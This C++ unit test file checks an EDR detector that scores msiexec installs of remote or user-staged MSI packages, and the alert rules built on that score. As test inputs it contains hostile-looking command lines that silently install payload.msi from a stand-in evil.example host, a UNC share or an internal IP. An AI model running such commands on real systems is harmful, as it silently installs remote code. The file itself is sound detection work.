/*
 * msi_package_install_detector_tests.cpp - Unit tests for
 * MsiPackageInstallDetector (T1546.016) and the production rules that
 * consume its score field.
 *
 * Detector tiers asserted here (per user/msi_package_install_detector.cpp):
 *   85 msi_remote_install  install verb + package from a URL (http /
 *                          https / ftp) or a UNC share.
 *   70 msi_staged_install  install verb + package in a user-writable
 *                          location (\Users\Public\, \AppData\, \Temp\ ...).
 *   Deliberate silences: packages under Program Files / Windows\Installer,
 *   msiexec without an install verb (/x, /p, /unreg, bare), and vendor
 *   binaries whose name merely ends in "msiexec".
 *
 * Production rules (added to rules/rules.json by the wiring agent):
 *   EDR-508  msi_package_score >= 75   high/alert  T1546.016
 *   EDR-509  msi_package_score 55-74   medium/log  T1546.016
 * The production-rule block is skipped while rules.json does not carry
 * them yet (same policy as the other production-rule suites).
 */
#include "msi_package_install_detector_tests.h"

#include <windows.h>

#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <fstream>
#include <stdexcept>
#include <string>
#include <vector>

#include "edr_event.h"
#include "event_bus.h"
#include "msi_package_install_detector.h"
#include "rule_engine.h"

namespace {

#define MS_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "msi package install test failed at line " +
            std::to_string(line) + ": " + expression);
}

constexpr uint64_t kSecond = 10000000ULL;

edr::Event PsScriptEvent(uint64_t ts, const char* scriptText) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kScriptBlockText] = scriptText;
    return event;
}

edr::Event ProcEvent(uint64_t ts, const char* image, const char* cmdLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (cmdLine != nullptr)
        event.fields[edr::field::kCommandLine] = cmdLine;
    return event;
}

bool HasScore(const edr::Event& event) {
    return event.fields.find(edr::field::kMsiPackageScore) !=
           event.fields.end();
}

void TestInspects() {
    MS_CHECK(edr::MsiPackageInstallDetector::Inspects(EDR_EVT_PROCESS_START));
    MS_CHECK(edr::MsiPackageInstallDetector::Inspects(
        EDR_EVT_POWERSHELL_SCRIPT));
    MS_CHECK(!edr::MsiPackageInstallDetector::Inspects(EDR_EVT_NET_LISTENER));
    MS_CHECK(!edr::MsiPackageInstallDetector::Inspects(EDR_EVT_REG_WRITE));
    MS_CHECK(!edr::MsiPackageInstallDetector::Inspects(EDR_EVT_FILE_CREATE));
}

void TestDisabled() {
    edr::MsiPackageInstallDetector detector(false, 55, 300, 1024);
    edr::Event http = ProcEvent(
        1000 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/payload.msi /qn");
    detector.Enrich(http);
    MS_CHECK(!HasScore(http));
    edr::Event staged = ProcEvent(
        1001 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i C:\\Users\\Public\\payload.msi");
    detector.Enrich(staged);
    MS_CHECK(!HasScore(staged));
}

void TestRemoteInstallTier85() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);

    edr::Event http = ProcEvent(
        1000 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/payload.msi /qn");
    detector.Enrich(http);
    MS_CHECK(http.fields.at(edr::field::kMsiPackageScore) == "85");
    MS_CHECK(http.fields.at(edr::field::kMsiPackageVerdict) == "malicious");
    MS_CHECK(http.fields.at(edr::field::kMsiPackageSignals) ==
             "msi_remote_install");
    MS_CHECK(http.fields.at(edr::field::kMsiPackageSources) == "https://");

    /* UNC share. */
    edr::Event unc = ProcEvent(
        1400 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec.exe /i \\\\fileserver\\share\\payload.msi /qn");
    detector.Enrich(unc);
    MS_CHECK(unc.fields.at(edr::field::kMsiPackageScore) == "85");
    MS_CHECK(unc.fields.at(edr::field::kMsiPackageSources) == "\\\\");

    /* PowerShell plane: body lives ONLY in kScriptBlockText. */
    edr::Event ps = PsScriptEvent(
        1800 * kSecond,
        "Start-Process msiexec.exe -ArgumentList '/i','http://10.0.0.9/x.msi'");
    detector.Enrich(ps);
    MS_CHECK(ps.fields.at(edr::field::kMsiPackageScore) == "85");
    MS_CHECK(ps.fields.at(edr::field::kMsiPackageSignals) ==
             "msi_remote_install");
}

void TestStagedInstallTier70() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);

    edr::Event publicDir = ProcEvent(
        1000 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i C:\\Users\\Public\\payload.msi /qn");
    detector.Enrich(publicDir);
    MS_CHECK(publicDir.fields.at(edr::field::kMsiPackageScore) == "70");
    MS_CHECK(publicDir.fields.at(edr::field::kMsiPackageVerdict) ==
             "suspicious");
    MS_CHECK(publicDir.fields.at(edr::field::kMsiPackageSignals) ==
             "msi_staged_install");

    edr::Event appdata = ProcEvent(
        1400 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /package C:\\Users\\admin\\AppData\\Local\\Temp\\p.msi");
    detector.Enrich(appdata);
    MS_CHECK(appdata.fields.at(edr::field::kMsiPackageScore) == "70");
    MS_CHECK(appdata.fields.at(edr::field::kMsiPackageFiles) ==
             "c:\\users\\admin\\appdata\\local\\temp\\p.msi");
}

void TestProgramFilesSilent() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);

    const char* const kNormalOps[] = {
        "msiexec /i \"C:\\Program Files\\Vendor\\setup.msi\" /qn",
        "msiexec /i C:\\Windows\\Installer\\cache\\app.msi /qb",
        "msiexec /i C:\\Deploy\\corp-app.msi /qn /norestart",
    };
    for (int i = 0; i < 3; ++i) {
        edr::Event ev = ProcEvent(
            (1000 + static_cast<uint64_t>(i)) * kSecond,
            "C:\\Windows\\System32\\msiexec.exe", kNormalOps[i]);
        detector.Enrich(ev);
        if (HasScore(ev))
            std::fprintf(stderr, "[msi_install] op scored: %s\n",
                         kNormalOps[i]);
        MS_CHECK(!HasScore(ev));
    }
    MS_CHECK(detector.StateCount() == 0);
}

void TestNoInstallVerbSilent() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);

    const char* const kNonInstall[] = {
        "msiexec /x {11111111-2222-3333-4444-555555555555} /qn",
        "msiexec /p C:\\Users\\Public\\patch.msp /qn",
        "msiexec /unreg",
        "msiexec",
    };
    for (int i = 0; i < 4; ++i) {
        edr::Event ev = ProcEvent(
            (1000 + static_cast<uint64_t>(i)) * kSecond,
            "C:\\Windows\\System32\\msiexec.exe", kNonInstall[i]);
        detector.Enrich(ev);
        if (HasScore(ev))
            std::fprintf(stderr, "[msi_install] verb scored: %s\n",
                         kNonInstall[i]);
        MS_CHECK(!HasScore(ev));
    }
    MS_CHECK(detector.StateCount() == 0);
}

void TestWordBoundaryNegatives() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);

    /* A vendor binary whose name merely ends in "msiexec". */
    edr::Event vendor = ProcEvent(
        1000 * kSecond, "C:\\Tools\\xmsiexec.exe",
        "xmsiexec.exe /i https://evil.example/payload.msi");
    detector.Enrich(vendor);
    MS_CHECK(!HasScore(vendor));

    /* A URL path segment containing "/i" must not be mistaken for the
     * install verb when msiexec is absent. */
    edr::Event notMsi = ProcEvent(
        1001 * kSecond, "C:\\Windows\\System32\\curl.exe",
        "curl -o C:\\Users\\Public\\x.msi https://host/install/x.msi");
    detector.Enrich(notMsi);
    MS_CHECK(!HasScore(notMsi));
}

void TestTokenTailBoundaryNegatives() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);

    /* Letter suffix glued onto the "msiexec" stem: "msiexecd" is a
     * different token, the tail edge must reject it even when an
     * install verb and a remote package are present. */
    edr::Event msiexecd = ProcEvent(
        1000 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexecd /i https://evil.example/payload.msi");
    detector.Enrich(msiexecd);
    MS_CHECK(!HasScore(msiexecd));

    /* Underscore continuation: identifier-style names glue onto the
     * stem, so "msiexec_silent" must not fire the staged-install 70
     * tier. */
    edr::Event silent = ProcEvent(
        1400 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec_silent /i C:\\Users\\Public\\payload.msi");
    detector.Enrich(silent);
    MS_CHECK(!HasScore(silent));

    MS_CHECK(detector.StateCount() == 0);
}

void TestMinScoreGating() {
    /* min_score 85: the 70 tier is filtered and, because the gate runs
     * before dedup bookkeeping, no key is inserted. */
    {
        edr::MsiPackageInstallDetector detector(true, 85, 300, 1024);
        edr::Event staged = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
            "msiexec /i C:\\Users\\Public\\payload.msi");
        detector.Enrich(staged);
        MS_CHECK(!HasScore(staged));
        MS_CHECK(detector.StateCount() == 0);

        edr::Event remote = ProcEvent(
            1100 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
            "msiexec /i https://evil.example/payload.msi");
        detector.Enrich(remote);
        MS_CHECK(remote.fields.at(edr::field::kMsiPackageScore) == "85");
        MS_CHECK(detector.StateCount() == 1);
    }
    /* min_score 55 (default): the 70 tier survives. */
    {
        edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);
        edr::Event staged = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
            "msiexec /i C:\\Users\\Public\\payload.msi");
        detector.Enrich(staged);
        MS_CHECK(staged.fields.at(edr::field::kMsiPackageScore) == "70");
    }
}

void TestDedupPerPackage() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);

    edr::Event first = ProcEvent(
        1000 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/a.msi");
    detector.Enrich(first);
    MS_CHECK(HasScore(first));
    MS_CHECK(detector.StateCount() == 1);

    /* Same package inside the window is suppressed. */
    edr::Event repeat = ProcEvent(
        1100 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/a.msi /qn");
    detector.Enrich(repeat);
    MS_CHECK(!HasScore(repeat));

    /* A different package is a different key and passes. */
    edr::Event other = ProcEvent(
        1100 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/b.msi");
    detector.Enrich(other);
    MS_CHECK(HasScore(other));
    MS_CHECK(detector.StateCount() == 2);

    /* Window expiry (300s) re-arms the first package. */
    edr::Event late = ProcEvent(
        1000 * kSecond + 301 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/a.msi");
    detector.Enrich(late);
    MS_CHECK(HasScore(late));
    MS_CHECK(detector.StateCount() == 2);
}

void TestStateCapacityReset() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1);
    edr::Event first = ProcEvent(
        1000 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/a.msi");
    detector.Enrich(first);
    MS_CHECK(HasScore(first));
    MS_CHECK(detector.StateCount() == 1);

    /* Second distinct key over capacity: dedup state resets, no UB, and
     * the detector keeps stamping. */
    edr::Event second = ProcEvent(
        1100 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/b.msi");
    detector.Enrich(second);
    MS_CHECK(HasScore(second));
    MS_CHECK(detector.StateCount() == 1);

    /* The reset re-arms the first package (its key was cleared). */
    edr::Event again = ProcEvent(
        1200 * kSecond, "C:\\Windows\\System32\\msiexec.exe",
        "msiexec /i https://evil.example/a.msi");
    detector.Enrich(again);
    MS_CHECK(HasScore(again));
    MS_CHECK(detector.StateCount() == 1);
}

void TestUnknownEventsSilent() {
    edr::MsiPackageInstallDetector detector(true, 55, 300, 1024);

    edr::Event reg;
    reg.type = EDR_EVT_REG_WRITE;
    reg.ts100ns = 1000 * kSecond;
    reg.fields[edr::field::kType] = "REG_WRITE";
    reg.fields[edr::field::kRegValue] = "msiexec /i https://evil.example/a.msi";
    detector.Enrich(reg);
    MS_CHECK(!HasScore(reg));

    edr::Event ps;
    ps.type = EDR_EVT_POWERSHELL_SCRIPT;
    ps.ts100ns = 1001 * kSecond;
    ps.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    detector.Enrich(ps);
    MS_CHECK(!HasScore(ps));

    edr::Event proc = ProcEvent(1002 * kSecond,
                                "C:\\Windows\\System32\\cmd.exe", nullptr);
    detector.Enrich(proc);
    MS_CHECK(!HasScore(proc));
}

/* Production-rule consumer check: rules are evaluated by the RuleEngine
 * against a hand-set msi_package_score field (the RuleEngine never calls
 * the detector itself). */
struct AlertRecord {
    std::string ruleId;
    std::string severity;
    std::string action;
    std::vector<std::string> mitre;
};

std::vector<AlertRecord> g_alerts;

bool HasAlert(const char* id) {
    for (const AlertRecord& a : g_alerts)
        if (a.ruleId == id) return true;
    return false;
}

const AlertRecord* FindAlert(const char* id) {
    for (const AlertRecord& a : g_alerts)
        if (a.ruleId == id) return &a;
    return nullptr;
}

const char* ProductionRulesPath() {
    return GetFileAttributesA("..\\rules\\rules.json") !=
                   INVALID_FILE_ATTRIBUTES
        ? "..\\rules\\rules.json"
        : "rules\\rules.json";
}

std::string ReadAllText(const char* path) {
    std::ifstream input(path, std::ios::binary);
    return std::string((std::istreambuf_iterator<char>(input)),
                       std::istreambuf_iterator<char>());
}

void FeedScore(edr::RuleEngine* engine, const char* score) {
    edr::Event ev;
    ev.type = EDR_EVT_PROCESS_START;
    ev.ts100ns = 1000 * kSecond;
    ev.fields[edr::field::kType] = "PROCESS_START";
    if (score != nullptr)
        ev.fields[edr::field::kMsiPackageScore] = score;
    g_alerts.clear();
    engine->OnEvent(ev);
}

void TestProductionRules() {
    /* EDR-508 (msi_package_score >= 75, high/alert, T1546.016) and
     * EDR-509 (55-74, medium/log, T1546.016) are written to
     * rules/rules.json by the wiring agent. Until then skip the block. */
    const char* path = ProductionRulesPath();
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) {
        std::fprintf(stderr,
                     "[msi_install] rules file not found; "
                     "skipping production rules\n");
        return;
    }
    const std::string rulesText = ReadAllText(path);
    if (rulesText.find("EDR-508") == std::string::npos ||
        rulesText.find("EDR-509") == std::string::npos) {
        std::fprintf(stderr,
                     "[msi_install] EDR-508/EDR-509 not in rules yet; "
                     "skipping production rules\n");
        return;
    }

    edr::RuleEngine engine;
    engine.LoadFromFile(path);
    engine.SetAlertCallback([](const edr::Alert& alert) {
        g_alerts.push_back(
            {alert.ruleId, alert.severity, alert.action, alert.mitreAttack});
    });

    /* High band: 100/85/75 land in >=75, so they hit EDR-508 only. */
    FeedScore(&engine, "100");
    MS_CHECK(HasAlert("EDR-508"));
    MS_CHECK(!HasAlert("EDR-509"));
    const AlertRecord* high = FindAlert("EDR-508");
    MS_CHECK(high != nullptr);
    MS_CHECK(high->severity == "high");
    MS_CHECK(high->action == "alert");
    MS_CHECK(std::find(high->mitre.begin(), high->mitre.end(),
                       "T1546.016") != high->mitre.end());

    FeedScore(&engine, "85");
    MS_CHECK(HasAlert("EDR-508"));
    MS_CHECK(!HasAlert("EDR-509"));
    FeedScore(&engine, "75");
    MS_CHECK(HasAlert("EDR-508"));
    MS_CHECK(!HasAlert("EDR-509"));

    /* Mid band: 74 must NOT hit the >=75 rule; 70/55 hit EDR-509 only. */
    FeedScore(&engine, "74");
    MS_CHECK(HasAlert("EDR-509"));
    MS_CHECK(!HasAlert("EDR-508"));
    const AlertRecord* mid = FindAlert("EDR-509");
    MS_CHECK(mid != nullptr);
    MS_CHECK(mid->severity == "medium");
    MS_CHECK(mid->action == "log");
    MS_CHECK(std::find(mid->mitre.begin(), mid->mitre.end(),
                       "T1546.016") != mid->mitre.end());
    FeedScore(&engine, "70");
    MS_CHECK(HasAlert("EDR-509"));
    MS_CHECK(!HasAlert("EDR-508"));
    FeedScore(&engine, "55");
    MS_CHECK(HasAlert("EDR-509"));
    MS_CHECK(!HasAlert("EDR-508"));

    /* Dead band 50-54 and below: none of the new rules may fire. */
    FeedScore(&engine, "54");
    MS_CHECK(!HasAlert("EDR-508"));
    MS_CHECK(!HasAlert("EDR-509"));
    FeedScore(&engine, "50");
    MS_CHECK(!HasAlert("EDR-508"));
    MS_CHECK(!HasAlert("EDR-509"));

    /* Missing score field: predicates on it are false (M3 semantics). */
    FeedScore(&engine, nullptr);
    MS_CHECK(!HasAlert("EDR-508"));
    MS_CHECK(!HasAlert("EDR-509"));
}

} // namespace

void RunMsiPackageInstallDetectorTests() {
    std::fprintf(stderr, "[msi_install] TestInspects\n");
    TestInspects();
    std::fprintf(stderr, "[msi_install] TestDisabled\n");
    TestDisabled();
    std::fprintf(stderr, "[msi_install] TestRemoteInstallTier85\n");
    TestRemoteInstallTier85();
    std::fprintf(stderr, "[msi_install] TestStagedInstallTier70\n");
    TestStagedInstallTier70();
    std::fprintf(stderr, "[msi_install] TestProgramFilesSilent\n");
    TestProgramFilesSilent();
    std::fprintf(stderr, "[msi_install] TestNoInstallVerbSilent\n");
    TestNoInstallVerbSilent();
    std::fprintf(stderr, "[msi_install] TestWordBoundaryNegatives\n");
    TestWordBoundaryNegatives();
    std::fprintf(stderr,
                 "[msi_install] TestTokenTailBoundaryNegatives\n");
    TestTokenTailBoundaryNegatives();
    std::fprintf(stderr, "[msi_install] TestMinScoreGating\n");
    TestMinScoreGating();
    std::fprintf(stderr, "[msi_install] TestDedupPerPackage\n");
    TestDedupPerPackage();
    std::fprintf(stderr, "[msi_install] TestStateCapacityReset\n");
    TestStateCapacityReset();
    std::fprintf(stderr, "[msi_install] TestUnknownEventsSilent\n");
    TestUnknownEventsSilent();
    std::fprintf(stderr, "[msi_install] TestProductionRules\n");
    TestProductionRules();
    std::fprintf(stderr, "[msi_install] all passed\n");
}
